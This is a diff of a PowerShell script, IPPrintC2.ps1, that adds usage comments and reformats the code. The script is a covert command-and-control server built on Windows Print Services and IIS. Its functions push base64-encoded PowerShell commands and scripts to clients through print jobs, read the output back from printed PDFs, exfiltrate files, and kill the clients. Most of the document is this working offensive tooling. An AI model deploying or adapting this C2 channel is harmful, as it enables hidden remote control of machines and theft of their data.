@@ -1,8 +1,13 @@
-﻿Write-Host -ForegroundColor Yellow "IPPrint C2 Server"
+﻿# IPPrintC2.ps1
+# -------------
+# PowerShell C2 server using Windows Print Services for covert command and control.
+# Run on the server hosting Print Services. Configure paths and DLLs as needed.
+
+Write-Host -ForegroundColor Yellow "IPPrint C2 Server"
 Add-Type -AssemblyName System.Drawing
 $IPPrintC2 = New-Object System.Drawing.Printing.PrintDocument
 
-#Remove the printing pop-up dialog.
+# Remove the printing pop-up dialog.
 $IPPrintC2.PrintController = New-Object System.Drawing.Printing.StandardPrintController
 
 # Get IIS log file directory.
@@ -13,11 +18,15 @@ $C2ExternalIP = (Invoke-WebRequest -Uri "https://ifconfig.me/ip").Content
 
 # Configure ClientPrinterName, ItextsharpDLL and C2Output paths based on your installation. ClientPrinterName is the name of installed printer on your clients.
 $ClientPrinterName = "XPS"
-$C2Output = "C:\temp\c2.pdf"
-$ItextsharpDLL = "$pwd\itextsharp.dll"
+$C2Output = "C:\\temp\\c2.pdf"
+$ItextsharpDLL = "$pwd\\itextsharp.dll"
 
-function Set-DefaultPrinter
-{
+# --- Usage ---
+# 1. Ensure IIS and Print Services are installed and configured.
+# 2. Set $ClientPrinterName, $C2Output, and $ItextsharpDLL as needed.
+# 3. Run this script as Administrator.
+
+function Set-DefaultPrinter {
     # Sets the default printer to the shared HTTP printer.
     Write-Host -ForegroundColor Green "Sets the default printer to the HTTP shared printer. If multiple instances of HTTP shared printers exist, do this manually."
     $DefaultPrinter = Get-WmiObject -class win32_printer -Namespace "root\cimv2" -Filter "Name LIKE '%\\%'"
@@ -26,71 +35,68 @@ function Set-DefaultPrinter
     Write-Host -ForegroundColor Green "Default printer set to" $DefaultPrinterQuery
 }
 
-function Invoke-ClearClientDocuments
-{
+function Invoke-ClearClientDocuments {
     # Clears client printed documents from queue to remove previous commands.
     $DefaultPrinterQuery = Get-WmiObject -class win32_printer -Namespace "root\cimv2" | Where-Object { $_.Default -eq 'True' } | Select-Object -expandproperty Name
     (Get-PrintJob $DefaultPrinterQuery | Where-Object {$_.documentname -eq "document"}).id | ForEach-Object {Remove-PrintJob -printername $DefaultPrinterQuery -ID $_ -ErrorAction SilentlyContinue}
 }
 
-function Invoke-ReadIISLog
-{
+function Invoke-ReadIISLog {
     # Read the IIS log.
     Get-ChildItem $IISlogfiles | Sort-Object -Property lastwritetime -Descending | Select-Object -First 1 | Get-Content | ForEach-Object {$_.split(" ")[0,1,3,4,8] -join ' '} | Select-String -NotMatch -Pattern "($C2ExternalIP)|(#)"
 }
 
 function Invoke-ConvertPDFtoText {
-	param(
-		[Parameter(Mandatory=$true)][string]$file
-	)
-	Add-Type -Path $ItextsharpDLL
-	$pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
-	for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
-		$text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
-		Write-Output $text
-	}
-	$pdf.Close()
+    param(
+        [Parameter(Mandatory=$true)][string]$file
+    )
+    Add-Type -Path $ItextsharpDLL
+    $pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
+    for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
+        $text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
+        Write-Output $text
+    }
+    $pdf.Close()
 }
 
 function Get-ConvertPDFtoText {
-	param(
-		[Parameter(Mandatory=$true)][string]$file
-	)
-	Add-Type -Path $ItextsharpDLL
-	$pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
-	$ctext=""
-	for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
-		$text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
-		$ctext=$ctext+$text
-	}
-	$pdf.Close()
-	return $ctext
+    param(
+        [Parameter(Mandatory=$true)][string]$file
+    )
+    Add-Type -Path $ItextsharpDLL
+    $pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
+    $ctext=""
+    for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
+        $text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
+        $ctext=$ctext+$text
+    }
+    $pdf.Close()
+    return $ctext
 }
 
 function Invoke-ReadC2Output {
-	if ((Get-Item $C2Output).Length -ne "0") {
-		Invoke-ConvertPDFtoText $C2Output
-		Invoke-ServerCleanup
-	} else {
-		Write-Host -ForegroundColor Red "File is empty" $C2Output
-	}
+    if ((Get-Item $C2Output).Length -ne "0") {
+        Invoke-ConvertPDFtoText $C2Output
+        Invoke-ServerCleanup
+    } else {
+        Write-Host -ForegroundColor Red "File is empty" $C2Output
+    }
 }
 
 function Invoke-FileC2Output {
-	param(
-		[Parameter(Mandatory=$true)][string]$outfile
-	)
-	if ((Get-Item $C2Output).Length -ne "0") {
-		$ctext = Get-ConvertPDFtoText $C2Output
-		[IO.File]::WriteAllBytes($outfile, ([convert]::FromBase64String(($ctext))))
-		Invoke-ServerCleanup
-	} else {
-		Write-Host -ForegroundColor Red "File is empty" $C2Output
-	}
+    param(
+        [Parameter(Mandatory=$true)][string]$outfile
+    )
+    if ((Get-Item $C2Output).Length -ne "0") {
+        $ctext = Get-ConvertPDFtoText $C2Output
+        [IO.File]::WriteAllBytes($outfile, ([convert]::FromBase64String(($ctext))))
+        Invoke-ServerCleanup
+    } else {
+        Write-Host -ForegroundColor Red "File is empty" $C2Output
+    }
 }
 
-function Invoke-ServerCleanup
-{
+function Invoke-ServerCleanup {
     # Save previous output from Print-to-File.
     if ((Get-Item $C2Output).Length -ne "0") {$date = (Get-Date -format "hh-mm-ss-ms_dd-mm-yyyy"); Rename-Item $C2Output $C2Output@$date.pdf; New-Item $C2Output | Out-Null}
 
@@ -99,8 +105,7 @@ function Invoke-ServerCleanup
     Get-PrintJob -PrinterName $DefaultPrinterQuery | ForEach-Object {Remove-PrintJob -PrinterName $DefaultPrinterQuery -ID $_.ID}
 }
 
-function Invoke-CommandsDocumentNameNoOutput
-{
+function Invoke-CommandsDocumentNameNoOutput {
     # Clean the server not to mess up command execution.
     Invoke-ServerCleanup
     # Convert PowerShell Command to Base64.
@@ -115,8 +120,7 @@ function Invoke-CommandsDocumentNameNoOutput
     }
 }
 
-function Invoke-CommandsDocumentNameWithOutput
-{
+function Invoke-CommandsDocumentNameWithOutput {
     # Clean the server not to mess up command execution.
     Invoke-ServerCleanup
     # Convert PowerShell Command to Base64.
@@ -131,8 +135,7 @@ function Invoke-CommandsDocumentNameWithOutput
     }
 }
 
-function Invoke-CommandsPowerShellScript
-{
+function Invoke-CommandsPowerShellScript {
     # Clean the server not to mess up command execution
     Invoke-ServerCleanup
     # Encode a PowerShell script to Base64. Keep them simple.
@@ -148,8 +151,7 @@ function Invoke-CommandsPowerShellScript
     }
 }
 
-function Invoke-DatatExfiltration
-{
+function Invoke-DatatExfiltration {
     # Clean the server not to mess up command execution.
     Invoke-ServerCleanup
 
@@ -163,8 +165,7 @@ function Invoke-DatatExfiltration
     $IPPrintC2.Print()
 }
 
-function Invoke-KillClients
-{
+function Invoke-KillClients {
     $answer = Read-Host "Are you sure you want to kill all clients (y/n)?"
     switch ($answer)
     {
